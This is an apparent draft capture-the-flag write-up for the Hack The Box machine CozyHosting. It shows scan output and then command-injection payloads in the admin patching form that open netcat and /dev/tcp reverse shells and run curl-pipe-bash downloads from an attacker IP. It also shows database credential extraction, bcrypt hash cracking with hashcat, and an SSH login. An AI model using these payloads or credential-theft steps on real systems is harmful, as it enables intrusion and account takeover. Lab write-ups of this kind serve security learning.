---
title: HTB CozyHosting
author: kei5uke
draft: true
description: Writeup for HTB CozyHosting
tags:
  - linux
  - writeup
---

Nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Feroxbuster

```
404   feroxbuster --url http://cozyhosting.htb --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt    
GET        1l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
204      GET        0l        0w        0c http://cozyhosting.htb/logout
200      GET       97l      196w     4431c http://cozyhosting.htb/login
401      GET        1l        1w       97c http://cozyhosting.htb/admin
200      GET       34l      172w    14934c http://cozyhosting.htb/assets/img/pricing-starter.png
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/logo.png
200      GET      295l      641w     6890c http://cozyhosting.htb/assets/js/main.js
200      GET       29l      174w    14774c http://cozyhosting.htb/assets/img/pricing-ultimate.png
200      GET       43l      241w    19406c http://cozyhosting.htb/assets/img/pricing-business.png
200      GET       29l      131w    11970c http://cozyhosting.htb/assets/img/pricing-free.png
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/favicon.png
200      GET       83l      453w    36234c http://cozyhosting.htb/assets/img/values-3.png
200      GET       73l      470w    37464c http://cozyhosting.htb/assets/img/values-1.png
200      GET        1l      313w    14690c http://cozyhosting.htb/assets/vendor/aos/aos.js
500      GET        1l        1w       73c http://cozyhosting.htb/error
200      GET       79l      519w    40905c http://cozyhosting.htb/assets/img/values-2.png
200      GET        1l      218w    26053c http://cozyhosting.htb/assets/vendor/aos/aos.css
200      GET       81l      517w    40968c http://cozyhosting.htb/assets/img/hero-img.png
200      GET        1l      625w    55880c http://cozyhosting.htb/assets/vendor/glightbox/js/glightbox.min.js
200      GET        7l     1222w    80420c http://cozyhosting.htb/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
200      GET     2397l     4846w    42231c http://cozyhosting.htb/assets/css/style.css
200      GET     2018l    10020w    95609c http://cozyhosting.htb/assets/vendor/bootstrap-icons/bootstrap-icons.css
200      GET       14l     1684w   143706c http://cozyhosting.htb/assets/vendor/swiper/swiper-bundle.min.js
200      GET        7l     2189w   194901c http://cozyhosting.htb/assets/vendor/bootstrap/css/bootstrap.min.css
200      GET      285l      745w    12706c http://cozyhosting.htb/
200      GET      285l      745w    12706c http://cozyhosting.htb/index
400      GET        1l       32w      435c http://cozyhosting.htb/plain]
400      GET        1l       32w      435c http://cozyhosting.htb/[
400      GET        1l       32w      435c http://cozyhosting.htb/]
400      GET        1l       32w      435c http://cozyhosting.htb/quote]
400      GET        1l       32w      435c http://cozyhosting.htb/extension]
400      GET        1l       32w      435c http://cozyhosting.htb/[0-9]
200      GET        0l        0w        0c http://cozyhosting.htb/render/https://www.google.com
200      GET        1l        1w      634c http://cozyhosting.htb/actuator
200      GET        0l        0w        0c http://cozyhosting.htb/asdfjkl;
400      GET        1l       32w      435c http://cozyhosting.htb/[2]
```

# Actuator endpoint

`29023AFC1FA54EB84E9100F207A0076F	"kanderson”`

# Admin Page

![[HTB CozyHosting - image.png]]

List of machines

Automatic Patching System

```
host=admin&username=;${IFS}nc${IFS}10.10.14.191${IFS}4444${IFS}-e${IFS}bash;

host=localhost&username=admin;${IFS}curl${IFS}-O${IFS}http://10.10.14.191/rev.sh;

/bin/bash${IFS}-i${IFS}>&${IFS}/dev/tcp/10.10.14.191/4444${IFS}0>&1

host=localhost&username=test;curl${IFS}http://10.10.14.191/rev.sh|bash;
```

LinPEAS

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                
══╣ Active Ports (netstat)                                                                                                  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                           
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      993/java 

```

```
app@cozyhosting:/app$ cat /tmp/app/BOOT-INF/classes/application.properties
cat /tmp/app/BOOT-INF/classes/application.properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

To access to PSQL: `psql -U postgres`

```
SELECT * from users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

`hashcat -m 3200 psql_hashes.txt /usr/share/wordlists/rockyou.txt`

`sshpass -p 'manchesterunited' ssh josh@cozyhosting.htb`
